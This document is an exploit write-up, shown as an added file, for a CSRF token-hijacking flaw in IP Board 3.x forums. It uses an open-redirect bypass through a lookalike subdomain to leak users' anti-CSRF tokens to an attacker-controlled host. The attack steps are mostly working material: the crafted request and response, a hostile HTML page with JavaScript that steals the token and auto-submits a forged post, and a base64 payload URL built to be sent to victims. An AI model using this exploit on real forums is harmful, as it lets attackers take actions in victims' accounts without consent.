@@ -1,0 +1,95 @@
+#Title: IP Board 3.x CSRF - Token hjiacking
+#Date: 03.09.14
+#Version: <= 3.4.6
+#Vendor: invisionpower.com
+#Author: Piotr S.
+#Video-PoC: https://www.youtube.com/watch?v=G5P21TA4DjY
+ 
+ 
+1) Introduction
+ 
+Latest and propabbly previous IPB verions suffers on vulnerability, which allows attacker to steal CSRF token of specific user. Function, which allows users to share forum links, does not properly sanitize user input. Mentioned token is attached in request as GET parameter, so it's able to obtain it if user will be redirected to evil domain. Using the token, it is able to perform various operations as demonstrated in attached video.
+ 
+ 
+2) PoC
+ 
+Let's take a closer look at following url:
+ 
+http://community.invisionpower.com/index.php?sharelink=print;aHR0cDovL2NvbW11bml0eS5pbnZpc2lvbnBvd2VyLmNvbS9mb3J1bS5waHA/aWQ9MjMzNQ==
+ 
+At first glance you can notice b64 string, after decoding it, you may see following address:
+http://community.invisionpower.com/forum.php?id=2334
+ 
+In this case, user should be redirected to default domain of the forum - community.invisionpower.com; it is able to bypass protection in this redirect, by creating particular subdomain on attacker website. it needs to contain address of victim forum otherwise it won't work.
+ 
+Request:
+GET /index.php?sharelink=print;aHR0cDovL2NvbW11bml0eS5pbnZpc2lvbnBvd2VyLmNvbS54b3JiLnBsL2V4cGxvaXQuaHRtbA== HTTP/1.1
+Host: community.invisionpower.com
+ 
+Response:
+302
+Location: http://community.invisionpower.com.xorb.pl/exploit.html?forcePrint=1&_k=161cc4d2d5503fdb483979f9c164b4d3
+ 
+Token is delivered as value of GET _k parameter. File to which user is redirected contains javascript, which grabs token that will be used in CSRF request.
+ 
+ 
+3) Reproduction
+ 
+a) Create subdomain
+ 
+http://forum.victim_site.com.your_domain.pl
+ 
+
+b) Then, create file exploit.html with this content:
+ 
+<html>
+    <head>
+        <script>
+            onload = function ipboard(){var token = window.location.hash.split('=')[2];document.getElementById('tokens').value=token;};function fo(){document.ipboards.submit();}; setTimeout("fo()",1500);
+        </script>
+    </head>
+    <body>
+    <form action="http://a10089.try.invisionpower.com/index.php?" method="POST" id="ipboards" name="ipboards" enctype="multipart/form-data">
+      <input type="hidden" name="TopicTitle" value="hacked!" />
+      <input type="hidden" name="isRte" value="0" />
+      <input type="hidden" name="noSmilies" value="0" />
+      <input type="hidden" name="Post" value="IPboard 3.x 0day" />
+      <input type="hidden" name="ipsTags" value="
+" />
+      <input type="hidden" name="enableemo" value="yes" />
+      <input type="hidden" name="enablesig" value="yes" />
+      <input type="hidden" name="st" value="0" />
+      <input type="hidden" name="app" value="forums" />
+      <input type="hidden" name="module" value="post" />
+      <input type="hidden" name="section" value="post" />
+      <input type="hidden" name="do" value="new_post_do" />
+      <input type="hidden" name="s" value="x" />
+      <input type="hidden" name="p" value="0" />
+      <input type="hidden" name="t" value="
+" />
+      <input type="hidden" name="f" value="2" />
+      <input type="hidden" name="parent_id" value="0" />
+      <input type="hidden" name="attach_post_key" value="x" />
+      <input type="hidden" id="tokens" name="auth_key" value="7xxx3e9" />
+      <input type="hidden" name="removeattachid" value="0" />
+      <input type="hidden" name="dosubmit" value="Post New Topic" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+<h1><b>IP Board 3.X PoC<br/>wait... ;)</b></h1>
+    </body>
+</html>
+ 
+c) Create payload
+ 
+http://community.invisionpower.com/index.php?sharelink=print;aHR0cDovL2ZvcnVtLnZpY3RpbV9zaXRlLmNvbS55b3VyX2RvbWFpbi5jb20vZXhwbG9pdC5odG1sIw==
+ 
+Now send this payload to victim - see video PoC for better understand.
+ 
+4) References
+ 
+ - https://www.youtube.com/watch?v=G5P21TA4DjY
+ - https://twitter.com/evil_xorb
+ 
+ 
+Happy hacking!
